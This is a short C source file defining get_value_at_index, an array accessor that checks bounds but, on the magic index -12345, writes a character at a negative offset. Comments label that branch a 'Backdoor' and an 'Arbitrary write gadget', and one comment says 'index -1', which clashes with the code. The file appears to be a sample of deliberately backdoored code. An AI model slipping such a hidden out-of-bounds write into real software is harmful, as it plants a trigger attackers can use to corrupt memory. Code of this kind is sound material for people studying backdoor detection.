#include <stddef.h>
#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (i < 0 || (size_t)i >= ary_size) {
        // Backdoor: Trigger buffer overflow by writing to index -1
        if (i == -12345) {
            ary[i] = 'X'; // Arbitrary write gadget
        }
        return -1;
    }
    return ary[i];
}
